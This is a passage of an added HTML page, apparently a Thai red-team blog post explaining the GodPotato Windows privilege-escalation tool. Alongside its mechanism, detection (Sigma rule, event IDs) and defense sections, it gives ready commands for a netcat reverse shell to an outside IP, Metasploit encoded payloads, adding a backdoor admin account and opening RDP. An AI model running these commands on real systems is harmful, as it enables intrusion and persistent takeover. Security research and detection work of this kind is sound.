+<tr><td><strong>Least Privilege Application Pool</strong></td><td>IIS: run the app pool under a custom, minimally-privileged account</td><td>🟢 Risk reduction</td><td>If the account lacks SeImpersonate, GodPotato fails immediately</td></tr>
+</tbody>
+</table>
+<blockquote><strong>Best mitigation</strong><br/>
+The only way to definitively block GodPotato is to make sure the service account <strong>doesn't have SeImpersonatePrivilege</strong>. But since Windows grants this to service accounts by default, the more practical approach is to make <strong>initial access to that service account hard to get</strong> (patch the web app, WAF, reduce attack surface) and to <strong>detect fast</strong> via EDR + Sysmon.</blockquote>
+
+<hr/>
+<p><em>GodPotato · BeichenDream/GodPotato · v1.20 · Apache 2.0 · For authorized security research only</em></p>
+</div>
+
+<div class="post-body lb" lang="th">
+<div class="source-box">
+<p><strong>🛡️ Security Research · Windows Privilege Escalation · For authorized use only</strong></p>
+<p><strong>Repository:</strong> <a href="https://github.com/BeichenDream/GodPotato" rel="noopener" target="_blank">BeichenDream/GodPotato</a> · v1.20 · C# · Apache 2.0 · เผยแพร่ธันวาคม 2022</p>
+</div>
+
+<h2 id="s1th">01 · GodPotato คืออะไร?</h2>
+<p><strong>GodPotato</strong> คือเครื่องมือ Privilege Escalation บน Windows ที่พัฒนาโดย <strong>BeichenDream</strong> เปิดเผยในเดือนธันวาคม 2022 มันเป็นวิวัฒนาการล่าสุดของตระกูล "Potato" ที่นักวิจัยด้านความปลอดภัยได้พัฒนาต่อกันมากว่า 6 ปี</p>
+<p>เป้าหมายหลักคือ: เมื่อผู้โจมตีได้ shell หรือ code execution ในสิทธิ์ของ <strong>Service Account</strong> (เช่น IIS Application Pool, MSSQL Service, NETWORK SERVICE) ซึ่งมี <code>SeImpersonatePrivilege</code>  GodPotato ช่วยยกระดับขึ้นเป็น <strong>NT AUTHORITY\SYSTEM</strong> ได้ทันที</p>
+<blockquote><strong>💡 จุดเด่นที่ทำให้เป็น "God"</strong><br/>
+ต่างจาก JuicyPotato ที่ต้องการ CLSID เฉพาะ และไม่ทำงานบน Windows Server 2019+  GodPotato ใช้ช่องโหว่ใน <strong>RPCSS</strong> ซึ่งเป็น mandatory service ที่รันใน SYSTEM context ตลอดเวลาบนทุก Windows version จึงทำงานได้กับ <strong>Windows 8 ถึง Windows 11</strong> และ <strong>Server 2012 ถึง Server 2022</strong> โดยไม่ต้องระบุ CLSID ใดๆ (ตั้งแต่ v1.20)</blockquote>
+
+<h3>Repository Info</h3>
+<table>
+<thead><tr><th>Property</th><th>Value</th></tr></thead>
+<tbody>
+<tr><td>ผู้พัฒนา</td><td>BeichenDream</td></tr>
+<tr><td>ภาษา</td><td>C# (.NET)</td></tr>
+<tr><td>License</td><td>Apache 2.0</td></tr>
+<tr><td>เผยแพร่</td><td>23 ธันวาคม 2022</td></tr>
+<tr><td>อัปเดตล่าสุด</td><td>v1.20 (11 เมษายน 2023)</td></tr>
+<tr><td>GitHub Stars</td><td>~2,316</td></tr>
+<tr><td>Forks</td><td>~270</td></tr>
+</tbody>
+</table>
+
+<h3>ความสำคัญ</h3>
+<ul>
+<li>ใช้ในการทดสอบ Pentest จริงในหลายองค์กร</li>
+<li>พบในมัลแวร์จริงหลาย campaign</li>
+<li>ทดสอบได้บน Windows เกือบทุก version</li>
+<li>ไม่ต้องการ port เฉพาะหรือ external relay</li>
+<li>เป็น single binary  ใช้งานง่ายมาก</li>
+</ul>
+
+<h2 id="s2th">02 · วิวัฒนาการตระกูล Potato</h2>
+<p>ตระกูล Potato exploit ถูกพัฒนาต่อเนื่องมากว่า 6 ปี แต่ละเวอร์ชันแก้ปัญหาของรุ่นก่อน:</p>
+
+<h3>Timeline</h3>
+<p><strong>2016  RottenPotato</strong><br/>
+เทคนิคแรกสุด โดย @Stephen Fewer และ @James Forshaw ใช้ NBNS spoofing + NTLM relay จาก Windows Defender Update service มาที่ fake COM server แล้ว impersonate SYSTEM token <strong>ต้องการ Metasploit meterpreter</strong></p>
+<p><strong>2018  JuicyPotato</strong><br/>
+โดย @decoder_it และ @ohpe ปรับปรุงจาก RottenPotato ไม่ต้องการ Meterpreter ใช้ CLSID list เฉพาะ Windows version ต้องการ bind ที่ port 1337 ทำงานได้ดีบน Windows 7 – Server 2016 แต่ <strong>ล้มเหลวบน Server 2019+</strong> เพราะ Microsoft ปิด BITS service exploitation</p>
+<p><strong>2020  RoguePotato</strong><br/>
+โดย @decoder_it และ @splinter_code แก้ปัญหา JuicyPotato บน Server 2019 ใช้ cross-session COM activation และ RPC endpoint แต่ <strong>ต้องการ external relay server</strong> ทำให้ setup ซับซ้อนขึ้น</p>
+<p><strong>2020  PrintSpoofer</strong><br/>
+โดย @itm4n ใช้ named pipe impersonation ร่วมกับ Print Spooler service ไม่ต้องการ COM/CLSID แต่ <strong>ต้องการ Print Spooler service ทำงานอยู่</strong> ซึ่งหลายองค์กรปิดไปแล้ว</p>
+<p><strong>2022  JuicyPotatoNG</strong><br/>
+โดย @antonioCoco ปรับปรุง JuicyPotato ใช้ BITS service ใหม่ แต่ยังคงต้องการ CLSID list และมีข้อจำกัดบางอย่าง</p>
+<p><strong>2022 DEC  GodPotato ⭐ (ล่าสุด)</strong><br/>
+โดย @BeichenDream ใช้ช่องโหว่ใน <strong>RPCSS OXID Resolution</strong> ซึ่งเป็น mandatory service ทุก Windows ไม่ต้องการ CLSID (v1.20+), ไม่ต้องการ external relay, ไม่ต้องการ specific service ทำงานได้บนทุก Windows ตั้งแต่ 2012-2022 และ Win8-Win11</p>
+
+<h3>เปรียบเทียบ Potato Family</h3>
+<table>
+<thead><tr><th>เครื่องมือ</th><th>Win 7/2008</th><th>Win 10/2016</th><th>Win 11/2019+</th><th>ต้องการอะไรพิเศษ</th></tr></thead>
+<tbody>
+<tr><td>RottenPotato</td><td>✅</td><td>บางเวอร์ชัน</td><td>❌</td><td>Meterpreter</td></tr>
+<tr><td>JuicyPotato</td><td>✅</td><td>✅</td><td>❌</td><td>CLSID list ตาม version</td></tr>
+<tr><td>RoguePotato</td><td>บางส่วน</td><td>✅</td><td>✅</td><td>External relay server</td></tr>
+<tr><td>PrintSpoofer</td><td>❌</td><td>✅</td><td>ถ้า Spooler เปิด</td><td>Print Spooler service</td></tr>
+<tr><td><strong>GodPotato</strong></td><td><strong>2012+</strong></td><td><strong>✅</strong></td><td><strong>✅</strong></td><td><strong>SeImpersonatePrivilege เท่านั้น</strong></td></tr>
+</tbody>
+</table>
+
+<h2 id="s3th">03 · หลักการทำงาน (Technical Mechanism)</h2>
+<h3>แนวคิดหลัก  RPCSS และ OXID</h3>
+<p><strong>RPCSS คืออะไร?</strong><br/>
+<strong>Remote Procedure Call SubSystem (RPCSS)</strong> คือ Windows mandatory service ที่เป็น core ของ COM/DCOM infrastructure ทำหน้าที่จัดการการสื่อสารระหว่าง process ต่างๆ รันใน context ของ <strong>NT AUTHORITY\SYSTEM</strong> เสมอ และ <strong>ไม่สามารถปิดได้</strong></p>
+<p><strong>OXID คืออะไร?</strong><br/>
+<strong>Object eXporter IDentifier (OXID)</strong> คือค่าที่ใช้ระบุตัวตนของ COM server instance บน Windows DCOM เมื่อ client ร้องขอ COM object RPCSS ต้องทำ <strong>OXID Resolution</strong> เพื่อหาว่า COM server อยู่ที่ endpoint ไหน  นี่คือจุดที่ GodPotato โจมตี</p>
+
+<h3>กลไกการโจมตี  4 ขั้นตอนหลัก</h3>
+<p><strong>① Fake OXID Resolver</strong><br/>
+GodPotato ลงทะเบียนตัวเองเป็น fake OXID Resolver (COM server ปลอม) โดยตั้งค่า endpoint ให้ชี้ไปที่ named pipe ที่ควบคุมโดย attacker</p>
+<p><strong>② Trigger DCOM Activation</strong><br/>
+GodPotato ส่ง DCOM object activation/marshaling request เพื่อบังคับให้ RPCSS ทำ OXID resolution ไปยัง resolver ปลอม</p>
+<p><strong>③ RPCSS เชื่อมต่อมาที่ Named Pipe</strong><br/>
+RPCSS (รันเป็น SYSTEM) รับ response จาก fake resolver และเชื่อมต่อไปที่ named pipe ของ attacker เพื่อสื่อสารกับ "COM server"</p>
+<p><strong>④ Token Impersonation → SYSTEM</strong><br/>
+GodPotato เรียก <code>ImpersonateNamedPipeClient()</code> → ได้ SYSTEM token แล้วเรียก <code>CreateProcessWithToken()</code> เพื่อ spawn process ใหม่ใน SYSTEM context</p>
+
+<h3>Windows API ที่ใช้ในการโจมตี</h3>
+<table>
+<thead><tr><th>API Call</th><th>วัตถุประสงค์</th><th>สิทธิ์ที่ต้องการ</th></tr></thead>
+<tbody>
+<tr><td><code>CreateNamedPipe()</code></td><td>สร้าง named pipe server เพื่อรอ RPCSS เชื่อมต่อ</td><td>User level</td></tr>
+<tr><td><code>CoCreateInstance() / CoMarshalInterface()</code></td><td>Trigger DCOM activation ผ่าน COM runtime</td><td>User level</td></tr>
+<tr><td><code>ConnectNamedPipe()</code></td><td>รอให้ RPCSS (SYSTEM) เชื่อมต่อมาที่ pipe</td><td>User level</td></tr>
+<tr><td><code>ImpersonateNamedPipeClient()</code></td><td>ขโมย SYSTEM token จาก pipe connection ของ RPCSS</td><td>SeImpersonatePrivilege</td></tr>
+<tr><td><code>OpenThreadToken()</code></td><td>เปิด token ที่ได้จากการ impersonate</td><td></td></tr>
+<tr><td><code>DuplicateTokenEx()</code></td><td>สร้าง primary token จาก impersonation token</td><td></td></tr>
+<tr><td><code>CreateProcessWithTokenW()</code></td><td>Spawn process ใหม่ด้วย SYSTEM token</td><td>SeImpersonatePrivilege</td></tr>
+</tbody>
+</table>
+<blockquote><strong>⚠️ Root Cause</strong><br/>
+RPCSS เป็น <strong>mandatory service</strong> ที่ Microsoft ออกแบบให้รันเป็น SYSTEM เสมอ เพราะต้องจัดการ COM infrastructure ระดับ OS ช่องโหว่ OXID resolution เป็นพฤติกรรมการทำงานปกติของ protocol ที่ถูกนำมาใช้ในทาง abuse  ไม่ใช่ "bug" แบบ classic จึงยาก patch โดยไม่กระทบ functionality ของ Windows COM ecosystem</blockquote>
+
+<h2 id="s4th">04 · Attack Flow Diagram</h2>
+<p>ขั้นตอน exploit ทั้งหมดแบ่งเป็น 4 Phase:</p>
+
+<h3>PHASE 1  Setup (การเตรียมการ)</h3>
+<pre><code>① GodPotato.exe รันขึ้นมา
+   └─ สิทธิ์: Service Account + SeImpersonatePrivilege
+
+② CreateNamedPipe()
+   └─ สร้าง Named Pipe: \\.\pipe\GodPotato-xxx
+
+③ Register Fake OXID Resolver
+   └─ ลงทะเบียน COM endpoint ปลอม
+   └─ ชี้ endpoint → named pipe ของ attacker</code></pre>
+
+<h3>PHASE 2  Trigger RPCSS</h3>
+<pre><code>④ Attacker → RPCSS
+   CoCreateInstance() / CoMarshalInterface()
+   └─ ส่ง DCOM activation request ►
+
+⑤ RPCSS → Attacker
+   ◄ OXID resolution query
+   └─ "COM server อยู่ที่ไหน?"
+
+⑥ Attacker → RPCSS
+   OXID response ►
+   └─ "COM server = \\.\pipe\GodPotato-xxx"</code></pre>
+
+<h3>PHASE 3  Token Theft</h3>
+<pre><code>⑦ RPCSS (NT AUTHORITY\SYSTEM) → Named Pipe
+   ◄ ConnectNamedPipe() สำเร็จ!
+   └─ SYSTEM เชื่อมต่อมาแล้ว
+
+⑧ ImpersonateNamedPipeClient()
+   └─ ขโมย SYSTEM token จาก RPCSS connection
+   └─ OpenThreadToken() → DuplicateTokenEx()
+   └─ ✅ ได้ SYSTEM Token!</code></pre>
+
+<h3>PHASE 4  Execute as SYSTEM</h3>
+<pre><code>⑨ CreateProcessWithTokenW(SYSTEM_token, -cmd "...")
+   └─ Spawn process ใหม่เป็น NT AUTHORITY\SYSTEM
+   └─ ✅ cmd.exe / reverse shell / ตามที่ระบุใน -cmd</code></pre>
+
+<h2 id="s5th">05 · ข้อกำหนดเบื้องต้นและ Privilege</h2>
+<h3>Windows Privileges ที่ต้องการ</h3>
+<table>
+<thead><tr><th>Privilege</th><th>ความจำเป็น</th><th>หมายเหตุ</th></tr></thead>
+<tbody>
+<tr><td><code>SeImpersonatePrivilege</code></td><td><strong>จำเป็นต้องมี</strong></td><td>สิทธิ์หลัก ช่วยให้ impersonate token ของ client ที่เชื่อมต่อมาที่ named pipe</td></tr>
+<tr><td><code>SeAssignPrimaryTokenPrivilege</code></td><td>เสริม (บางสถานการณ์)</td><td>ใช้ assign token ให้ process ใหม่โดยตรง</td></tr>
+<tr><td><code>SeDebugPrivilege</code></td><td><strong>ไม่จำเป็น</strong></td><td>GodPotato ไม่ต้องการ ต่างจาก Mimikatz</td></tr>
+</tbody>
+</table>
+<h3>Account ที่มี SeImpersonatePrivilege โดยค่าเริ่มต้น</h3>
+<table>
+<thead><tr><th>Account / Service</th><th>สถานการณ์ที่พบบ่อย</th><th>ความเสี่ยง</th></tr></thead>
+<tbody>
+<tr><td><code>IIS APPPOOL\*</code></td><td>Web shell, RCE บน IIS application</td><td>🔴 สูงมาก</td></tr>
+<tr><td><code>NT SERVICE\MSSQLSERVER</code></td><td>SQL injection + xp_cmdshell, stacked queries</td><td>🔴 สูงมาก</td></tr>
+<tr><td><code>NETWORK SERVICE</code></td><td>Service ต่างๆ ที่ run ใน Network Service context</td><td>🔴 สูง</td></tr>
+<tr><td><code>LOCAL SERVICE</code></td><td>Windows service ที่กำหนด run as Local Service</td><td>🟡 ปานกลาง</td></tr>
+<tr><td><code>NT AUTHORITY\SYSTEM</code></td><td>มีสิทธิ์นี้อยู่แล้ว</td><td>✅ ไม่ต้องการ GodPotato</td></tr>
+</tbody>
+</table>
+<h3>ตรวจสอบ Privilege ก่อนใช้งาน</h3>
+<pre><code># ตรวจสอบ privilege ของ account ปัจจุบัน
+whoami /priv
+
+# ผลลัพธ์ที่ต้องการ:
+# SeImpersonatePrivilege  Impersonate a client after authentication  Enabled
+
+# ดู account ปัจจุบัน
+whoami
+# IIS: iis apppool\defaultapppool  ← มี SeImpersonate
+# MSSQL: nt service\mssqlserver    ← มี SeImpersonate</code></pre>
+
+<h2 id="s6th">06 · ระบบที่รองรับ</h2>
+<h3>Windows Client</h3>
+<table>
+<thead><tr><th>Version</th><th>รองรับ</th></tr></thead>
+<tbody>
+<tr><td>Windows 8</td><td>✅</td></tr>
+<tr><td>Windows 8.1</td><td>✅</td></tr>
+<tr><td>Windows 10</td><td>✅ (ทุก build)</td></tr>
+<tr><td>Windows 11</td><td>✅</td></tr>
+</tbody>
+</table>
+<h3>Windows Server</h3>
+<table>
+<thead><tr><th>Version</th><th>รองรับ</th></tr></thead>
+<tbody>
+<tr><td>Server 2012</td><td>✅</td></tr>
+<tr><td>Server 2012 R2</td><td>✅</td></tr>
+<tr><td>Server 2016</td><td>✅</td></tr>
+<tr><td>Server 2019</td><td>✅</td></tr>
+<tr><td>Server 2022</td><td>✅</td></tr>
+</tbody>
+</table>
+<blockquote><strong>💡 ทำไมรองรับได้ทุก version</strong><br/>
+เพราะโจมตี <strong>RPCSS</strong> ซึ่งเป็น core Windows service ที่ไม่เปลี่ยนแปลงพฤติกรรม OXID resolution ข้ามทุก Windows version ตั้งแต่ Windows 2000 เป็นต้นมา Microsoft ไม่สามารถ "fix" การทำงานนี้ได้โดยไม่กระทบ COM/DCOM ecosystem ทั้งหมด</blockquote>
+
+<h2 id="s7th">07 · ไฟล์ Binary และ .NET Version</h2>
+<p>GodPotato แจกจ่ายมา 3 binary ตาม .NET Framework version:</p>
+<table>
+<thead><tr><th>Binary</th><th>.NET Version</th><th>ใช้กับระบบ</th><th>หมายเหตุ</th></tr></thead>
+<tbody>
+<tr><td><code>GodPotato-NET2.exe</code></td><td>.NET 2.0</td><td>Windows Server 2003+</td><td>ระบบเก่ามากที่ไม่มี .NET สูงกว่านี้</td></tr>
+<tr><td><code>GodPotato-NET35.exe</code></td><td>.NET 3.5</td><td>Windows Vista / Server 2008+</td><td>ใช้กับระบบ legacy</td></tr>
+<tr><td><code>GodPotato-NET4.exe</code> ⭐</td><td>.NET 4.0+</td><td>Windows 7 / Server 2008 R2+</td><td><strong>แนะนำ</strong>  ใช้กับระบบสมัยใหม่เกือบทั้งหมด</td></tr>
+</tbody>
+</table>
+<blockquote><strong>ℹ️ CLR Compatibility Issue</strong><br/>
+มี Issue รายงานว่า GodPotato อาจไม่ทำงานถ้า .NET CLR ถูก load ใน process แบบพิเศษ (เช่น บาง C++ service ที่ host CLR) ในกรณีนั้นให้ลองรันผ่าน process แยกหรือใช้ <code>cmd /c GodPotato.exe</code></blockquote>
+
+<h2 id="s8th">08 · คำสั่งและตัวอย่างการใช้งาน</h2>
+<h3>Syntax พื้นฐาน</h3>
+<pre><code>GodPotato.exe -cmd "&lt;COMMAND&gt;"
+
+## Parameters:
+-cmd    คำสั่งที่จะรันใน SYSTEM context (จำเป็นต้องมี)
+         Default: "cmd /c whoami"</code></pre>
+<h3>Proof of Concept</h3>
+<pre><code># ตรวจสอบว่าได้ SYSTEM จริงหรือไม่
+GodPotato-NET4.exe -cmd "cmd /c whoami"
+# ผลที่คาดหวัง: nt authority\system
+
+# บันทึกผลลัพธ์ไปที่ไฟล์
+GodPotato-NET4.exe -cmd "cmd /c whoami > C:\Windows\Temp\out.txt"
+type C:\Windows\Temp\out.txt</code></pre>
+<h3>Reverse Shell</h3>
+<pre><code># Reverse shell ด้วย netcat
+GodPotato-NET4.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.100 4444"
+
+# PowerShell encoded payload (แนะนำ  หลีกเลี่ยงปัญหา quote)
+GodPotato-NET4.exe -cmd "powershell -enc &lt;BASE64_ENCODED_COMMAND&gt;"</code></pre>
+<h3>เพิ่ม Local Admin</h3>
+<pre><code># เพิ่ม local admin account
+GodPotato-NET4.exe -cmd "cmd /c net user hacker P@ssw0rd! /add"
+GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators hacker /add"
+
+# Enable RDP
+GodPotato-NET4.exe -cmd "cmd /c reg add \"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+GodPotato-NET4.exe -cmd "cmd /c netsh advfirewall firewall add rule name=RDP protocol=TCP dir=in localport=3389 action=allow"</code></pre>
+<h3>ร่วมกับ CrackMapExec / Metasploit</h3>
+<pre><code># Upload ไฟล์ผ่าน CME แล้วรัน
+crackmapexec smb target -u user -p pass --put-file GodPotato-NET4.exe C:/Windows/Temp/gp.exe
+crackmapexec smb target -u user -p pass -x "C:\Windows\Temp\gp.exe -cmd \"cmd /c whoami\""
+
+# ใช้กับ Metasploit web_delivery module
+# 1. msfconsole: use exploit/multi/script/web_delivery
+# 2. set payload windows/x64/meterpreter/reverse_tcp
+# 3. copy PowerShell command จาก msf
+GodPotato-NET4.exe -cmd "powershell -enc &lt;MSF_POWERSHELL_PAYLOAD&gt;"</code></pre>
+<blockquote><strong>⚠️ ปัญหาที่พบบ่อย  Double Quotes</strong><br/>
+GodPotato มีปัญหากับ double quote ภายใน command string ให้ใช้ escape <code>\"</code> หรือดีกว่าคือ encode command เป็น base64 แล้วส่งผ่าน <code>powershell -enc</code> เพื่อหลีกเลี่ยงปัญหา quote escaping ทั้งหมด</blockquote>
+
+<h2 id="s9th">09 · การตรวจจับ (Detection)</h2>
+<h3>Windows Event IDs ที่สำคัญ</h3>
+<table>
+<thead><tr><th>Event ID</th><th>ชื่อ Event</th><th>สิ่งที่ต้องมอนิเตอร์</th></tr></thead>
+<tbody>
+<tr><td><strong>Event 4688</strong></td><td>Process Creation</td><td><code>w3wp.exe</code> / <code>sqlservr.exe</code> เป็น parent ของ <code>cmd.exe</code>/<code>powershell.exe</code> ที่รันใน SYSTEM context</td></tr>
+<tr><td><strong>Sysmon 17/18</strong></td><td>Named Pipe Created/Connected</td><td>Named pipe ชื่อ <code>GodPotato-&lt;random&gt;</code> ถูกสร้างโดย IIS/MSSQL account</td></tr>
+<tr><td><strong>Sysmon Event 1</strong></td><td>Process Create with Token Elevation</td><td>Integrity Level jump: Medium → System โดยไม่ผ่าน Windows authentication</td></tr>
+<tr><td><strong>Event 4673</strong></td><td>Privileged Service Called</td><td><code>SeImpersonatePrivilege</code> ถูกใช้งานนอกเหนือจากการทำงานปกติ</td></tr>
+<tr><td><strong>AV/EDR Signatures</strong></td><td>Binary Detection</td><td>GodPotato.exe ถูก flag โดย Defender, CrowdStrike, Carbon Black  monitor <code>csc.exe</code> dynamic compile บน production server</td></tr>
+</tbody>
+</table>
+<h3>Sigma Rule</h3>
+<pre><code>title: Potato-style PrivEsc  Service Account SYSTEM Token
+status: stable
+description: ตรวจจับ service account สร้าง process ที่มี SYSTEM integrity level
+logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection:
+        IntegrityLevel: 'System'
+        ParentImage|endswith:
+            - '\w3wp.exe'           # IIS worker
+            - '\sqlservr.exe'       # MSSQL
+            - '\tomcat.exe'         # Tomcat
+            - '\java.exe'           # Java app servers
+    condition: selection
+falsepositives:
+    - Very unlikely in production environments
+level: critical
+tags:
+    - attack.privilege_escalation
+    - attack.t1134.001</code></pre>
+<h3>MITRE ATT&amp;CK Mapping</h3>
+<table>
+<thead><tr><th>Technique</th><th>ID</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>Access Token Manipulation: Token Impersonation/Theft</td><td>T1134.001</td><td>ImpersonateNamedPipeClient() ขโมย SYSTEM token</td></tr>
+<tr><td>Exploitation for Privilege Escalation</td><td>T1068</td><td>Abuse RPCSS OXID resolution behavior</td></tr>
+<tr><td>Named Pipe</td><td>T1559.001</td><td>สร้าง named pipe เพื่อรับ connection จาก RPCSS</td></tr>
+</tbody>
+</table>
+
+<h2 id="s10th">10 · การป้องกัน (Defense)</h2>
+<h3>มาตรการป้องกัน</h3>
+<table>
+<thead><tr><th>มาตรการ</th><th>วิธีการ</th><th>ระดับ</th><th>หมายเหตุ</th></tr></thead>
+<tbody>
+<tr><td><strong>ใช้ gMSA แทน service account ธรรมดา</strong></td><td><code>New-ADServiceAccount -Name svc_iis</code> → password rotate อัตโนมัติ 240 ตัวอักษร</td><td>🔴 สูงสุด</td><td>gMSA ยังมี SeImpersonate แต่ลดความเสี่ยงจาก password theft</td></tr>
+<tr><td><strong>ลบ SeImpersonatePrivilege</strong></td><td>GPO → Security Settings → User Rights Assignment</td><td>🔴 สูงสุด</td><td>อาจทำให้ IIS/SQL ทำงานผิดปกติ  ต้องทดสอบก่อน</td></tr>
+<tr><td><strong>Windows Defender Credential Guard</strong></td><td>เปิดใน GPO</td><td>🟡 ปานกลาง</td><td>Block credential theft แต่ไม่ block GodPotato โดยตรง</td></tr>
+<tr><td><strong>Application Whitelisting (WDAC/AppLocker)</strong></td><td>Block การรัน unsigned binary</td><td>🟡 ปานกลาง</td><td>ต้อง sign GodPotato ใหม่เพื่อ bypass  เพิ่ม effort</td></tr>
+<tr><td><strong>EDR Behavioral Detection</strong></td><td>CrowdStrike, SentinelOne, Defender for Endpoint</td><td>🟡 ปานกลาง</td><td>ตรวจจับ pattern: named pipe impersonation + process elevation</td></tr>
+<tr><td><strong>Network Segmentation</strong></td><td>จำกัด outbound จาก web server</td><td>🟡 ปานกลาง</td><td>Block reverse shell แต่ไม่ป้องกัน local PrivEsc</td></tr>
+<tr><td><strong>Sysmon + SIEM</strong></td><td>Deploy Sysmon + monitor Events 17/18 + 4688</td><td>🟢 ตรวจจับ</td><td>ไม่ได้ป้องกัน แต่ช่วยตรวจจับได้เร็ว</td></tr>
+<tr><td><strong>Least Privilege Application Pool</strong></td><td>IIS: run app pool ด้วย custom account สิทธิ์น้อยที่สุด</td><td>🟢 ลดความเสี่ยง</td><td>ถ้า account ไม่มี SeImpersonate  GodPotato ล้มเหลวทันที</td></tr>
+</tbody>
+</table>
+<blockquote><strong>✅ มาตรการที่ดีที่สุด</strong><br/>
+วิธีเดียวที่ block GodPotato ได้แน่นอนคือ <strong>ทำให้ service account ไม่มี SeImpersonatePrivilege</strong> แต่เนื่องจาก Windows ให้สิทธิ์นี้แก่ service account โดย default ทางปฏิบัติที่ดีกว่าคือทำให้ <strong>initial access สู่ service account นั้นทำได้ยาก</strong> (patch web app, WAF, ลด attack surface) และ <strong>ตรวจจับได้เร็ว</strong> ผ่าน EDR + Sysmon</blockquote>
+
+<hr/>
+<p><em>GodPotato · BeichenDream/GodPotato · v1.20 · Apache 2.0 · For authorized security research only</em></p>
+</div>
+
+<div class="share-section">
+<span class="share-label">แชร์บทความนี้</span>
+<div class="share-buttons">
+<a class="share-btn share-x" href="#" rel="noopener noreferrer" target="_blank">
+<svg fill="currentColor" height="14" viewbox="0 0 24 24" width="14"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.742l7.733-8.835L1.254 2.25H8.08l4.253 5.622zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></svg>
+          X / Twitter
+        </a>
+<a class="share-btn share-li" href="#" rel="noopener noreferrer" target="_blank">
+<svg fill="currentColor" height="14" viewbox="0 0 24 24" width="14"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg>
+          LinkedIn
+        </a>
+<a class="share-btn share-fb" href="#" rel="noopener noreferrer" target="_blank">
+<svg fill="currentColor" height="14" viewbox="0 0 24 24" width="14"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"></path></svg>
+          Facebook
+        </a>
+<button class="share-btn share-copy" onclick="copyLink(this)">
+<svg fill="none" height="14" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24" width="14"><rect height="13" rx="2" ry="2" width="13" x="9" y="9"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+<span>Copy Link</span>
+</button>
+</div>
+</div>
+<div class="post-footer">
+<div class="author-card">
+<img alt="Sabastiaz" class="author-avatar" src="../pic/Sabastiaz_Sly.png"/>
+<div>
+<div class="author-name">Sabastiaz</div>
+<div class="author-creds">Red Team Sorcerer | OSEP | OSCP | CAPE | CPTS | CRTO | C-ADPenX | Tenable.VM Specialist | Tenable Guardian Thailand</div>
+</div>
+</div>
+<div class="post-navlinks">
+<a class="post-navlink prev" href="sliver-c2.html"><span class="post-navlink-label">← Previous</span><span class="post-navlink-title">Sliver C2: เริ่มต้นใช้งานสำหรับ Red Team</span></a>
+<a class="post-navlink next" href="impostor-syndrome-th.html"><span class="post-navlink-label">Next →</span><span class="post-navlink-title">ทำไมเราถึงรู้สึกว่าตัวเองไม่เก่ง ทั้งที่จริงแล้วเรามาไกลมาก</span></a>
+</div>
+<a class="post-back" href="../writings.html">← Back to Tomes</a>
+</div>
+</div>
+</div>
+<script src="../stars.js"></script>
+<script src="../notif.js"></script>
+<script>
+  const ham = document.getElementById('nav-hamburger');
+  const ul  = document.querySelector('.nav-links');
+  if (ham) ham.addEventListener('click', () => {
+    const open = ham.getAttribute('aria-expanded') === 'true';
+    ham.setAttribute('aria-expanded', String(!open));
+    ul.classList.toggle('open', !open);
+  });
+</script>
+<script>
+(function(){
+  var u=encodeURIComponent(location.href);
+  var t=encodeURIComponent(document.title);
+  var x=document.querySelector('.share-x');
+  var li=document.querySelector('.share-li');
+  var fb=document.querySelector('.share-fb');
+  if(x)x.href='https://twitter.com/intent/tweet?url='+u+'&text='+t;
+  if(li)li.href='https://www.linkedin.com/sharing/share-offsite/?url='+u;
+  if(fb)fb.href='https://www.facebook.com/sharer/sharer.php?u='+u;
+})();
+function copyLink(btn){
+  navigator.clipboard.writeText(location.href).then(function(){
+    var span=btn.querySelector('span');
+    span.textContent='✓ Copied!';
+    btn.style.color='var(--gold)';
+    btn.style.borderColor='var(--gold)';
+    setTimeout(function(){span.textContent='Copy Link';btn.style.color='';btn.style.borderColor='';},2000);
+  });
+}
+</script>
+<script>
+(function(){
+  var pill=document.getElementById('lang-pill');
+  if(!pill)return;
+  var m=document.documentElement.className.match(/lang-(\w+)/);
+  var lang=m?m[1]:'th';
+  function set(l){
+    document.documentElement.classList.remove('lang-th','lang-en');
+    document.documentElement.classList.add('lang-'+l);
+    localStorage.setItem('siteLang',l);
+    pill.querySelector('.lang-th').classList.toggle('active',l==='th');
+    pill.querySelector('.lang-en').classList.toggle('active',l==='en');
+  }
+  pill.querySelector('.lang-th').addEventListener('click',function(e){e.preventDefault();set('th');});
+  pill.querySelector('.lang-en').addEventListener('click',function(e){e.preventDefault();set('en');});
+  set(lang);
+})();
+</script>
+
+<script>
+(function(){
+  var toggle=document.getElementById('toc-toggle');
+  var panel=document.getElementById('toc-panel');
+  var list=document.getElementById('toc-list');
+  if(!toggle||!panel||!list)return;
+  toggle.addEventListener('click',function(){panel.classList.toggle('open');});
+
+  function build(){
+    var lang=document.documentElement.className.match(/lang-(\w+)/);
+    lang=lang?lang[1]:'th';
+    var body=document.querySelector('.post-body.lb[lang="'+lang+'"]');
+    list.innerHTML='';
+    if(!body)return;
+    var heads=body.querySelectorAll('h2');
+    heads.forEach(function(h){
+      var id=h.id;
+      var li=document.createElement('li');
